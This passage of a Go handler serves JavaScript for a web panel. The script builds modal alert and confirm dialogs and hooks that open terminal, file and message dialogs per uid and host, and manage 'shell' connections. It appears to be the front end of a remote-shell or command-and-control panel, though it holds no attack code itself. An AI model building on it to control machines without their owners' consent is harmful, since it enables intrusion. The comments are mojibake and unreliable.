    if (stateName === "done" || stateName === "error") {
        record.timer = setTimeout(() => {
            removeTransferToast(id);
        }, typeof options.removeAfter === "number" ? options.removeAfter : 1600);
    }

    return id;
}

function customAlert(message) {
    // 閬僵
    let overlay = document.createElement("div");
    overlay.style.position = "fixed";
    overlay.style.inset = "0";
    overlay.style.background = "rgba(0,0,0,0.35)";
    overlay.style.zIndex = "9999";

    // 寮圭獥
    let alertBox = document.createElement("div");
    alertBox.style.position = "fixed";
    alertBox.style.top = "50%";
    alertBox.style.left = "50%";
    alertBox.style.transform = "translate(-50%, -50%)";
    alertBox.style.background = "#fff";
    alertBox.style.width = "500px";
    alertBox.style.maxWidth = "85%";
    alertBox.style.maxHeight = "70vh";
    alertBox.style.borderRadius = "12px";
    alertBox.style.boxShadow = "0 10px 30px rgba(0,0,0,0.25)";
    alertBox.style.padding = "20px";
    alertBox.style.zIndex = "10000";
    alertBox.style.fontFamily = "Arial, sans-serif";
    alertBox.style.overflow = "auto";

    // 鍏抽棴鎸夐挳
    let closeButton = document.createElement("button");
    closeButton.innerHTML = "x";
    closeButton.style.position = "absolute";
    closeButton.style.right = "12px";
    closeButton.style.top = "8px";
    closeButton.style.width = "32px";
    closeButton.style.height = "32px";
    closeButton.style.border = "none";
    closeButton.style.background = "transparent";
    closeButton.style.fontSize = "26px";
    closeButton.style.cursor = "pointer";
    closeButton.style.color = "#666";
    closeButton.onmouseenter = () => {
        closeButton.style.color = "#000";
    };
    closeButton.onmouseleave = () => {
        closeButton.style.color = "#666";
    };
    closeButton.onclick = function () {
        document.body.removeChild(overlay);
    };
    alertBox.appendChild(closeButton);
    // 鍐呭
    let messageText = document.createElement("pre");
    messageText.textContent = message;
    messageText.style.textAlign = "left";
    messageText.style.whiteSpace = "pre-wrap";
    messageText.style.wordBreak = "break-word";
    messageText.style.fontSize = "14px";
    messageText.style.lineHeight = "1.5";
    messageText.style.marginTop = "25px";
    messageText.style.color = "#333";
    alertBox.appendChild(messageText);
    overlay.appendChild(alertBox);
    document.body.appendChild(overlay);
    // 鐐瑰嚮閬僵鍏抽棴
    overlay.onclick = function(e) {
        if (e.target === overlay) {
            document.body.removeChild(overlay);
        }
    };
}
function customConfirm(message) {
    return new Promise((resolve) => {
        // 閬僵
        let overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.inset = "0";
        overlay.style.background = "rgba(0,0,0,0.35)";
        overlay.style.zIndex = "9999";

        // 寮圭獥
        let confirmBox = document.createElement("div");
        confirmBox.style.position = "fixed";
        confirmBox.style.top = "50%";
        confirmBox.style.left = "50%";
        confirmBox.style.transform = "translate(-50%, -50%)";
        confirmBox.style.background = "#fff";
        confirmBox.style.width = "400px";
        confirmBox.style.maxWidth = "85%";
        confirmBox.style.borderRadius = "12px";
        confirmBox.style.boxShadow = "0 10px 30px rgba(0,0,0,0.25)";
        confirmBox.style.padding = "25px";
        confirmBox.style.zIndex = "10000";
        confirmBox.style.fontFamily = "Arial, sans-serif";
        confirmBox.style.textAlign = "center";

        // 鍐呭
        let messageText = document.createElement("div");
        messageText.textContent = message;
        messageText.style.fontSize = "16px";
        messageText.style.color = "#333";
        messageText.style.marginBottom = "25px";
        messageText.style.whiteSpace = "pre-wrap";

        confirmBox.appendChild(messageText);

        // 鎸夐挳瀹瑰櫒
        let buttonBox = document.createElement("div");
        buttonBox.style.display = "flex";
        buttonBox.style.justifyContent = "center";
        buttonBox.style.gap = "20px";

        // 纭畾鎸夐挳
        let okButton = document.createElement("button");
        okButton.textContent = "yes";
        okButton.style.width = "90px";
        okButton.style.padding = "8px";
        okButton.style.border = "none";
        okButton.style.borderRadius = "6px";
        okButton.style.background = "#2196f3";
        okButton.style.color = "#fff";
        okButton.style.cursor = "pointer";

        // 鍙栨秷鎸夐挳
        let cancelButton = document.createElement("button");
        cancelButton.textContent = "no";
        cancelButton.style.width = "90px";
        cancelButton.style.padding = "8px";
        cancelButton.style.border = "none";
        cancelButton.style.borderRadius = "6px";
        cancelButton.style.background = "#ddd";
        cancelButton.style.color = "#333";
        cancelButton.style.cursor = "pointer";

        function close(result){
            document.body.removeChild(overlay);
            resolve(result);
        }
        okButton.onclick = () => {
            close(true);
        };

        cancelButton.onclick = () => {
            close(false);
        };

        buttonBox.appendChild(okButton);
        buttonBox.appendChild(cancelButton);

        confirmBox.appendChild(buttonBox);

        overlay.appendChild(confirmBox);
        document.body.appendChild(overlay);
        // 鐐瑰嚮澶栭儴鍏抽棴
        overlay.onclick = function(e){
            if(e.target === overlay){
                close(false);
            }
        };

    });
}

window.lainIndex = new lain_index();
window.l_index = window.l_index || new index();
window.showTerminalDialog = function(uid, host, os) {
    // 杩欓噷瑕佺敤浣犵殑绫诲疄渚嬶紝姣斿
    if (window.lainIndex) {
        window.lainIndex.showTerminalDialog(uid, host, os);
    }
};
window.showFileDialog = function(uid, host, dir) {
    if (window.lainIndex) {
        window.lainIndex.showFileDialog(uid, host, dir);
    }
};
window.showMsgDialog = function(uid, host) {
    if (window.lainIndex) {
        window.lainIndex.showMsgDialog(uid, host);
    }
};
window.get_conn = async function(uid, shellname) {
    if (!window.l_index) {
        return false;
    }
    const sent = await window.l_index.get(uid, shellname);
    if (!sent) {
        return false;
    }
    return true;
};
window.del_conn = function(index) {
    if (window.l_index) {
        return window.l_index.del(index);
    }
    return false;
};
if (!window.fileDialogButtonBound) {
    document.addEventListener("click", function(event) {
        const button = event.target.closest(".file-open-btn");
        if (!button) {
            return;
        }
        const uid = button.dataset.uid || "";
        const host = button.dataset.host || "";
        const dir = button.dataset.dir || "./";
        if (window.lainIndex) {
            window.lainIndex.showFileDialog(uid, host, dir);
        }
    });
    window.fileDialogButtonBound = true;
}
`

			w.Header().Set("Content-Type", "text/javascript")
			fmt.Fprint(w, html)
			return
		}
	}
}
